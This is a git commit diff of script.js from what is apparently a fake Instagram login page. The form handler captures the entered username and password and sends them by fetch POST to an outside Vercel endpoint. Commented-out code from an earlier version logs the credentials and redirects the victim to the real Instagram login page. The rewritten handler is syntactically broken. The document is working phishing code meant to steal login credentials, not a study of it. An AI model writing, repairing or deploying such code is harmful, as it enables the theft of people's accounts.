9a3784ee08a5e6f957a7488922ca6e01fb1a8df8
KINDARXPIRE1 <farouqakinfenwa@gmail.com>
2025-01-01 22:25:41 +0100

    transfer

--- script.js
+++ script.js
@@ -1,23 +1,43 @@
-document.getElementById('loginForm').addEventListener('submit', function(event) {
+// document.getElementById('loginForm').addEventListener('submit', function(event) {
+//     event.preventDefault();
+
+//     const username = document.getElementById('username').value;
+//     const password = document.getElementById('password').value;
+
+//     // Log the credentials to the console
+//     console.log('Username:', username);
+//     console.log('Password:', password);
+
+//     // Optionally, you can redirect the user to the real Instagram login page
+//     window.location.href = 'https://www.instagram.com/accounts/login/';
+// });
+
+
+//     const username = document.getElementById('username').value;
+//     const password = document.getElementById('password').value;
+
+//     // Send the credentials to your server
+//     fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
+//         method: 'POST',
+//         headers: {
+//             'Content-Type': 'application/json',
+//         },
+//         body: JSON.stringify({ username: username, password: password }),
+//     })
+//     .then(response => response.json())
+//     .then(data => {
+//         console.log('Success:', data);
+    
+//     })
+//     .catch((error) => {
+//         console.error('Error:', error);
+//     });
+document.getElementById('loginForm').addEventListener('submit'), function(event) {
     event.preventDefault();
 
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    // Log the credentials to the console
-    console.log('Username:', username);
-    console.log('Password:', password);
-
-    // Optionally, you can redirect the user to the real Instagram login page
-    window.location.href = 'https://www.instagram.com/accounts/login/';
-});
-
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    // Send the credentials to your server
-    fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
+  
+      // Send the credentials to your server
+      fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -32,3 +52,10 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     .catch((error) => {
         console.error('Error:', error);
     });
+
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // Log the credentials to the console…
+}
